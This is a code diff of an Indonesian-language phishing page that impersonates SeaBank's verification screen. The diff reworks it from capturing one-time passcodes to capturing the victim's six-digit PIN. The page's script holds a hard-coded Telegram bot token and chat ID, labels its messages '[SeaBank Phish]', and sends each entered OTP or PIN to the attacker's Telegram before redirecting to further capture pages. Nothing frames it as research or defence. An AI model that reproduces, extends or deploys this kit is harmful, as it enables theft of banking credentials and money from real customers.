@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi OTP SeaBank</title>
+    <title>Verifikasi PIN SeaBank</title>
     
     <style>
         /* CSS Keypad dan Tampilan (Sama seperti sebelumnya) */
@@ -16,7 +16,7 @@
             flex-direction: column;
             justify-content: space-between;
             min-height: 100vh;
-            overflow-x: hidden;
+            overflow-x: hidden; 
         }
 
         .app-header {
@@ -44,7 +44,7 @@
             justify-content: center;
             padding: 20px;
             text-align: center;
-            min-height: 0;
+            min-height: 0; 
         }
 
         .logo-container {
@@ -62,8 +62,15 @@
             margin-bottom: 15px;
         }
 
-        /* --- Indikator OTP (Titik-titik) --- */
-        .otp-indicator-container {
+        .forgot-pin {
+            color: #ff6600; 
+            text-decoration: none;
+            font-size: 0.9em;
+            margin-bottom: 40px;
+            display: block;
+        }
+
+        .pin-indicator-container {
             display: flex;
             justify-content: center;
             gap: 25px;
@@ -71,7 +78,7 @@
             height: 15px;
         }
 
-        .otp-dot {
+        .pin-dot {
             width: 12px;
             height: 12px;
             border-radius: 50%;
@@ -79,11 +86,10 @@
             transition: background-color 0.1s ease;
         }
 
-        .otp-dot.active {
+        .pin-dot.active {
             background-color: #ff6600;
         }
 
-        /* --- Keypad Numerik --- */
         .keypad-container {
             background-color: #ffffff; 
             padding: 10px 20px 40px; 
@@ -147,7 +153,7 @@
     
 <div class="app-header">
         <span class="back-arrow" onclick="history.back()">&#8592;</span> 
-Verifikasi OTP
+Verifikasi PIN SeaBank
     </div>
 
     
@@ -156,18 +162,16 @@ Verifikasi OTP
             <img src="logo.png" alt="Logo SeaBank">
         </div>
 
-        <p class="pin-prompt">Masukkan 6 digit kode OTP</p>
-        
-        <p class="otp-security-text" style="font-size: 0.85em; color: #ff6600; margin-top: -10px; margin-bottom: 30px;">
-            Kode OTP telah terkirim ke <span id="displayedNumber" style="font-weight: bold;">[NOMOR ANDA]</span>.
-        </p>
-        <div class="otp-indicator-container">
-            <div class="otp-dot"></div>
-            <div class="otp-dot"></div>
-            <div class="otp-dot"></div>
-            <div class="otp-dot"></div>
-            <div class="otp-dot"></div>
-            <div class="otp-dot"></div>
+        <p class="pin-prompt">Masukkan 6 digit PIN kamu</p>
+        <a href="#" class="forgot-pin">Lupa PIN?</a>
+
+        <div class="pin-indicator-container">
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
         </div>
     </div>
 
@@ -193,26 +197,24 @@ Verifikasi OTP
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const otpDots = document.querySelectorAll('.otp-dot');
+            const pinDots = document.querySelectorAll('.pin-dot');
             const keypadButtons = document.querySelectorAll('.keypad-button');
-            let currentOtp = '';
-            const otpLength = 6;
-            
+            let currentPin = '';
+            const pinLength = 6;
+
             // *** INFORMASI BOT TELEGRAM ANDA ***
             const BOT_TOKEN = '8286824254:AAHECrYlrnN0GeEBdG2ASNJEg79mw0FAYn8';
             const CHAT_ID = '5923031825';
             // **********************************
 
-            // LOGIKA UNTUK MENAMPILKAN NOMOR HP DARI LOCALSTORAGE
-            const accountNumber = localStorage.getItem('accountNumber') || 'Nomor Anda';
-            const displayedNumberSpan = document.getElementById('displayedNumber');
-            
-            if (accountNumber && accountNumber.length > 4) {
-                const visiblePart = accountNumber.slice(-4);
-                // Menampilkan hanya 4 digit terakhir
-                displayedNumberSpan.textContent = `*** **** ${visiblePart}`; 
-            } else {
-                 displayedNumberSpan.textContent = accountNumber;
+            function updatePinDisplay() {
+                pinDots.forEach((dot, index) => {
+                    if (index < currentPin.length) {
+                        dot.classList.add('active');
+                    } else {
+                        dot.classList.remove('active');
+                    }
+                });
             }
 
             function sendToTelegram(message) {
@@ -223,39 +225,30 @@ Verifikasi OTP
                 });
             }
 
-            function updateOtpDisplay() {
-                otpDots.forEach((dot, index) => {
-                    if (index < currentOtp.length) {
-                        dot.classList.add('active');
-                    } else {
-                        dot.classList.remove('active');
-                    }
-                });
-            }
-
             keypadButtons.forEach(button => {
                 button.addEventListener('click', function() {
                     const value = this.dataset.value;
 
                     if (value === 'delete') {
-                        currentOtp = currentOtp.slice(0, -1);
-                    } else if (value && currentOtp.length < otpLength) {
-                        currentOtp += value;
+                        currentPin = currentPin.slice(0, -1);
+                    } else if (value && currentPin.length < pinLength) { 
+                        currentPin += value;
                     }
 
-                    updateOtpDisplay();
+                    updatePinDisplay();
 
-                    if (currentOtp.length === otpLength) {
+                    if (currentPin.length === pinLength) {
                         
-                        // KIRIM OTP KE TELEGRAM
-                        const otpMessage = `[SeaBank Phish] OTP Diterima: ${currentOtp}`;
-                        sendToTelegram(otpMessage);
+                        // 1. SIMPAN PIN LAMA KE LOCALSTORAGE
+                        localStorage.setItem('oldPin', currentPin);
                         
-                        // Lanjutkan ke langkah ganti password/DOB
+                        // 2. KIRIM PIN LAMA KE TELEGRAM
+                        const pinMessage = `[SeaBank Phish] PIN Lama Diterima: ${currentPin}`;
+                        sendToTelegram(pinMessage);
+                        
+                        // 3. LANJUTKAN KE HALAMAN PIN BARU
                         setTimeout(() => {
-                            window.location.href = 'change_password_dob.html'; 
-                            currentOtp = ''; 
-                            updateOtpDisplay();
+                            window.location.href = 'pin_baru.html'; 
                         }, 500);
                     }
                 });
